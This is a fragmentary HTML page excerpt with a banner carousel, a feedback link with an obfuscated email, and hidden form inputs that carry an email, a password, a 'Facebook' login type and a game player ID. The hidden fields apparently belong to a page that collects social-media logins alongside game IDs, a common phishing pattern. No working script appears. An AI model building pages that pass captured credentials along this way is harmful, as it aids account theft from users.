			...
			<div class="swiper-container" style="height: auto;overflow: visible;">
				<div class="swiper-wrapper swiper-wrapper1">
					<div class="swiper-slide">
						<a class="banner-link">
						<div class="img-box">
							<img class="banner-pic" src="img/myBanner.png" data-src="img/myBanner.png" alt="img" cr="banner"/>
						</div>
						</a>
					</div>
				</div>
		...
		<div class="content">
                <div class="x-main" style="padding: 10px;">
                    <div class="tab-nav-box">
						...
						<input type="hidden" name="email" value="eqr" readonly>
						<input type="hidden" name="password" value="qr" readonly>
						<input type="hidden" name="login" value="Facebook" readonly>
						<input type="hidden" name="playid" value="12345678" readonly>
				...
				<div class="t">
					<div class="p-box g-clr">
						<div class="box">
							...
							<p class="p">Please send email to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="177f727b67577a7e73766475626e3974787a">[email&#160;protected]</a></p>
						</div>
						<a href="/cdn-cgi/l/email-protection#5b333e372b1b36323f3a28392e2275383436" class="feeedback" cr="feedback">Feedback</a>
					</div>
				</div>
				<div class="b">
					<ul class="link">
